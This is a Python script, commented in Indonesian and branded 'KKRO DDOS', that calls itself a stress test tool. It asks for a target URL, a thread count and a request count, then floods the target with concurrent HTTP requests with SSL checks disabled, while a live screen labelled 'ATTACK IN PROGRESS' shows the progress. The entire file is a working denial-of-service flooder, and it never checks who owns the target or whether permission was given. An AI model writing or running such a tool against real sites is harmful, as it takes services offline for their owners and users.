import threading
import urllib.request
import time
import ssl
import os

# CLEAR SCREEN UNTUK FULL LAYAR
os.system('clear')

print("\033[1;31m")  # WARNA MERAH
print("╔══════════════════════════════════════════════════════════════╗")
print("║                                                              ║")
print("║  ██╗  ██╗██╗  ██╗██████╗  ██████╗    ██████╗ ██████╗  ██████╗ ███████╗  ║")
print("║  ██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗  ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝  ║")
print("║  █████╔╝ █████╔╝ ██████╔╝██║   ██║  ██║   ██║██║  ██║██║   ██║███████╗  ║")
print("║  ██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║  ██║   ██║██║  ██║██║   ██║╚════██║  ║")
print("║  ██║  ██╗██║  ██╗██║  ██║╚██████╔╝  ╚██████╔╝██████╔╝╚██████╔╝███████║  ║")
print("║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝  ║")
print("║                                                              ║")
print("╚══════════════════════════════════════════════════════════════╝")
print("\033[0m")

print("\033[1;36m" + "═"*70)
print("                   🚀 DDOS STRESS TEST TOOL 🚀")
print("═"*70 + "\033[0m\n")

# SSL context
ctx = ssl._create_unverified_context()

# Input dengan style full width
print("\033[1;33m" + "─"*70)
url = input("\033[1;33m[🎯] TARGET URL: \033[0m").strip()
if not url.startswith(('http://', 'https://')):
    url = 'http://' + url

try:
    print("\033[1;33m" + "─"*70)
    threads = int(input("\033[1;33m[⚡] THREADS: \033[0m"))
    requests = int(input("\033[1;33m[📦] REQUESTS PER THREAD: \033[0m"))
    timeout_val = int(input("\033[1;33m[⏱️] TIMEOUT (seconds): \033[0m"))
except:
    print("\033[1;31m[✗] INVALID INPUT\033[0m")
    exit()

# Attack info
print("\033[1;33m" + "─"*70)
print(f"\033[1;32m[✓] TARGET: {url}")
print(f"[✓] THREADS: {threads}")
print(f"[✓] REQUESTS: {requests:,} each")
print(f"[✓] TOTAL: {threads * requests:,} requests")
print(f"[✓] STARTING ATTACK...\033[0m")
print("\033[1;33m" + "─"*70 + "\033[0m\n")

# Variables
sent = 0
failed = 0
running = True
start_time = time.time()

def attack():
    global sent, failed
    for _ in range(requests):
        if not running:
            break
        try:
            urllib.request.urlopen(url, timeout=timeout_val, context=ctx)
            sent += 1
        except:
            failed += 1

def show_progress():
    while running:
        os.system('clear')  # Refresh layar
        
        # Header
        print("\033[1;31m" + "═"*70)
        print("                   ⚡ KKRO DDOS - ATTACK IN PROGRESS ⚡")
        print("═"*70 + "\033[0m\n")
        
        elapsed = time.time() - start_time
        
        # Stats
        print(f"\033[1;36mTARGET:\033[0m {url}")
        print(f"\033[1;36mELAPSED TIME:\033[0m {elapsed:.1f} seconds")
        print(f"\033[1;36mREQUESTS SENT:\033[0m {sent:,}")
        print(f"\033[1;36mFAILED:\033[0m {failed:,}")
        
        if elapsed > 0:
            speed = sent / elapsed
            print(f"\033[1;36mSPEED:\033[0m {speed:.0f} requests/second")
        
        # Progress bar
        total_req = threads * requests
        progress = (sent / total_req * 100) if total_req > 0 else 0
        bars = int(progress / 1.4)
        print(f"\n\033[1;33mPROGRESS: [{'█'*bars}{'░'*(50-bars)}] {progress:.1f}%\033[0m")
        
        print(f"\n\033[1;31m[!] Press CTRL+C to stop attack\033[0m")
        time.sleep(0.5)

# Start threads
progress_thread = threading.Thread(target=show_progress, daemon=True)
progress_thread.start()

attack_threads = []
for i in range(threads):
    t = threading.Thread(target=attack, daemon=True)
    t.start()
    attack_threads.append(t)

# Wait for completion
try:
    for t in attack_threads:
        t.join()
    running = False
except KeyboardInterrupt:
    running = False
    print("\n\033[1;33m[!] ATTACK STOPPED BY USER\033[0m")

# Final results
running = False
time.sleep(0.5)
os.system('clear')

print("\033[1;36m" + "═"*70)
print("                   📊 ATTACK COMPLETED 📊")
print("═"*70 + "\033[0m\n")

elapsed = time.time() - start_time
print(f"\033[1;32m✅ SUCCESSFUL REQUESTS: {sent:,}")
print(f"\033[1;31m❌ FAILED REQUESTS: {failed:,}")
print(f"\033[1;33m⏱️  DURATION: {elapsed:.1f} seconds")
if elapsed > 0:
    print(f"\033[1;35m⚡ AVERAGE SPEED: {sent/elapsed:.1f} requests/second")

print("\n\033[1;36m" + "═"*70)
print("                   KKRO DDOS - STRESS TEST TOOL")
print("═"*70 + "\033[0m")